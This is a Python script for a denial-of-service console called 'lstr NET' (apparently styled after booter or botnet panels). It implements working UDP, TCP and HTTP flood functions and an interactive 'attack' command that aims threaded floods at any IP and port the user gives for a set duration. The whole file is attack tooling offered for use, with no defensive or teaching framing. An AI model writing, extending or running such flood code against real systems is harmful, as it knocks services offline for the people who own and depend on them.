#!/usr/bin/env python3
# ================================================
# lstr – STOL3N/MEV NET CONSOLE (RED/WHITE ONLY)
# ================================================

import os, sys, socket, threading, random, time, struct
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# ---------- ENABLE ANSI COLORS ON WINDOWS ----------
if os.name == 'nt':
    os.system('')                     # enables \033[...] in cmd

# ---------- COLORS ----------
R = "\033[91m"   # RED
W = "\033[97m"   # WHITE
C = "\033[0m"    # RESET

# ---------- TOOL INFO ----------
TOOL_NAME   = "lstr"
USER        = "stol3n/mev"
ACTIVE_BOTS = 3

# ---------- BANNER ----------
BANNER = f"""{R}
        __  _         _          
       / / | |       | |         
      / /  | |  ___  | |_   _ __ 
     / /   | | / __| | __| | '__|
    / /    | | \__ \ | |_  | |   
   /_/     |_| |___/  \__| |_|   
  
{W} >>> {TOOL_NAME.upper()} NET <<<{C}
"""

# ---------- HINT LINES (kept after every clear) ----------
HINTS = f"""{W}>> type {R}help{C} for commands
>> type {R}methods{C} to see all methods
>> type {R}plan{C} to see your plan
"""

# ---------- DYNAMIC TITLE ----------
def set_title():
    status = "ONLINE" if ATTACK_RUNNING else "IDLE"
    title = f"lstr Net - Bots: {ACTIVE_BOTS} - Admin"
    if os.name == 'nt':
        os.system(f'title {title}')
    else:                               # Linux/macOS
        sys.stdout.write(f'\33]0;{title}\a')
        sys.stdout.flush()

# ---------- ATTACK STATE ----------
ATTACK_RUNNING = False
ATTACK_THREAD  = None

# ========================================
# ATTACK METHODS
# ========================================
def udp_flood(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1490)
    sent = 0
    end = time.time() + duration
    while time.time() < end and ATTACK_RUNNING:
        try:
            sock.sendto(payload, (ip, port))
            sent += 1
            if sent % 5000 == 0:
                print(f"{W}[UDP] {sent:,} to {ip}:{port}{C}")
        except:
            pass
    print(f"{W}[UDP] Sent {sent:,} packets.{C}")

def tcp_flood(ip, port, duration):
    end = time.time() + duration
    while time.time() < end and ATTACK_RUNNING:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((ip, port))
            s.send(b"\x00" * 1024)
            s.close()
        except:
            pass

def http_flood(ip, port, duration):
    payload = f"GET /?{random.randint(0,999999)} HTTP/1.1\r\nUser-Agent: {TOOL_NAME}\r\n\r\n".encode()
    end = time.time() + duration
    while time.time() < end and ATTACK_RUNNING:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.sendall(payload)
            s.close()
        except:
            pass

ATTACK_MAP = {"udp": udp_flood, "tcp": tcp_flood, "http": http_flood}

# ========================================
# COMMANDS
# ========================================
def cmd_help():
    print(f"""{W}
COMMANDS:
  {R}help{C}     – this menu
  {R}methods{C}  – list attacks
  {R}plan{C}     – your access info
  {R}attack{C} <ip> <port> <threads> <sec> <method>
  {R}stop{C}     – stop current attack
  {R}clear{C}    – clear screen (keeps banner & hints)
  {R}exit{C}     – quit
{W}""")

def cmd_methods():
    print(f"{W}METHODS: {R}udp tcp http{C}")

def cmd_plan():
    print(f"""{W}
PLAN:
  User   : {R}{USER.upper()}{W}
  Bots   : {R}{ACTIVE_BOTS:,}{W}
  Time   : {R}{datetime.now().strftime('%H:%M:%S')}{W}
  Status : {R}{'ONLINE' if ATTACK_RUNNING else 'IDLE'}{W}
{W}""")

def launch_attack(ip, port, threads, duration, method):
    global ATTACK_RUNNING, ATTACK_THREAD
    if ATTACK_RUNNING:
        print(f"{R}[!] Attack already running – use 'stop'.{C}")
        return
    if method not in ATTACK_MAP:
        print(f"{R}[!] Unknown method: {method}{C}")
        return

    print(f"{W}[+] {R}{method.upper()}{W} to {R}{ip}:{port}{W} | {R}{threads}{W} threads | {R}{duration}s{C}")
    ATTACK_RUNNING = True
    set_title()

    def run():
        with ThreadPoolExecutor(max_workers=threads) as pool:
            for _ in range(threads):
                pool.submit(ATTACK_MAP[method], ip, port, duration)
        global ATTACK_RUNNING
        ATTACK_RUNNING = False
        print(f"{W}[+] Attack finished.{C}")
        set_title()

    ATTACK_THREAD = threading.Thread(target=run, daemon=True)
    ATTACK_THREAD.start()

def cmd_stop():
    global ATTACK_RUNNING
    if not ATTACK_RUNNING:
        print(f"{R}[!] No attack running.{C}")
        return
    ATTACK_RUNNING = False
    print(f"{R}[!] Stopping…{C}")
    time.sleep(1.5)
    print(f"{W}[+] Attack terminated.{C}")
    set_title()

# ========================================
# MAIN LOOP
# ========================================
def main():
    # Full clear only once at start
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER)
    print(HINTS)
    set_title()

    while True:
        try:
            line = input(f"{R}{USER}@{TOOL_NAME.lower()}{W}> {C}").strip().lower()
            if not line: continue
            cmd = line.split()
            action = cmd[0]

            if action == "help":
                cmd_help()
            elif action == "methods":
                cmd_methods()
            elif action == "plan":
                cmd_plan()
            elif action == "clear":
                # *** ONLY CLEAR OUTPUT, KEEP BANNER + HINTS ***
                os.system('cls' if os.name == 'nt' else 'clear')
                print(BANNER)
                print(HINTS)
                set_title()
            elif action == "attack" and len(cmd) == 6:
                try:
                    ip, port, threads, dur, meth = cmd[1], int(cmd[2]), int(cmd[3]), int(cmd[4]), cmd[5]
                    launch_attack(ip, port, threads, dur, meth)
                except Exception:
                    print(f"{R}[!] Bad args – attack <ip> <port> <threads> <sec> <method>{C}")
            elif action == "stop":
                cmd_stop()
            elif action in ("exit", "quit"):
                cmd_stop()
                print(f"{W}Shutting down…{C}")
                break
            else:
                print(f"{R}?? unknown – type help{C}")

        except KeyboardInterrupt:
            print(f"\n{R}Ctrl‑C – use 'exit' to quit.{C}")
        except Exception as e:
            print(f"{R}Error: {e}{C}")

if __name__ == "__main__":
    main()
